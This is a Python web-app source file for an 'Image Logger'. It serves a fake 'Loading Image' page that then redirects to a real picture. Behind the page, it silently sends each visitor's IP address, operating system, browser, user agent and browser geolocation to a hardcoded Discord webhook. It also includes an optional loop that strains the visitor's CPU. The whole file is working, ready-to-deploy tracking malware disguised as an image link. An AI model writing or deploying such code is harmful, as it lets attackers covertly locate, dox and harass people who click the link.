import json
import httpagentparser
import aiohttp
from aiohttp import web

# ==== CONFIG ====
options = {
    "accurate_location": True,  # Request geolocation after page load
    "browser_stress": False      # Optional browser stress
}

config = {
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
    "loading_image": "https://via.placeholder.com/600x400?text=Loading...",
    "username": "Image Logger",
    "color": 0x00FFFF
}

# ==== HELPER FUNCTION TO SEND WEBHOOK ====
async def send_webhook(ip, useragent, lat=None, lon=None):
    os, browser = httpagentparser.simple_detect(useragent or "")
    payload = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""
**IP Info**
> IP: {ip}
> Coords: {lat or 'Unknown'}, {lon or 'Unknown'}

**PC Info**
> OS: {os}
> Browser: {browser}

**User Agent**
{useragent or 'Unknown'}
"""
        }]
    }
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(config["webhook"], json=payload)
        except:
            print("Webhook failed")

# ==== GET HANDLER ====
async def handler(request):
    ip = request.headers.get("x-forwarded-for", request.remote)
    useragent = request.headers.get("User-Agent", "")

    # Send initial report
    await send_webhook(ip, useragent)

    # JS for geolocation & optional browser stress
    geo_js = ""
    if options["accurate_location"]:
        geo_js = f"""
if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
        function(position) {{
            fetch('/', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    ip: '{ip}',
                    useragent: '{useragent}'
                }})
            }});
        }}
    );
}}
"""
    stress_js = ""
    if options["browser_stress"]:
        stress_js = "for (let i=0;i<1e8;i++){Math.sqrt(i);}"

    html = f"""
<html>
<head>
<meta property="og:image" content="{config['loading_image']}">
<title>Loading Image</title>
</head>
<body style="text-align:center;">
<h2>Loading Image...</h2>
<img src="{config['loading_image']}" style="width:50%;height:auto;">
<script>
setTimeout(function() {{
    window.location.href = '{config['image']}';
}}, 2000);
{geo_js}
{stress_js}
</script>
</body>
</html>
"""
    return web.Response(text=html, content_type='text/html')

# ==== POST HANDLER FOR GEO DATA ====
async def post_handler(request):
    try:
        data = await request.json()
        await send_webhook(data.get("ip"), data.get("useragent"), data.get("lat"), data.get("lon"))
    except:
        pass
    return web.Response(text="OK")

# ==== VERCEL SERVERLESS ENTRY POINT ====
app = web.Application()
app.router.add_get('/', handler)
app.router.add_post('/', post_handler)

def main(req, res):
    return web.run_app(app)
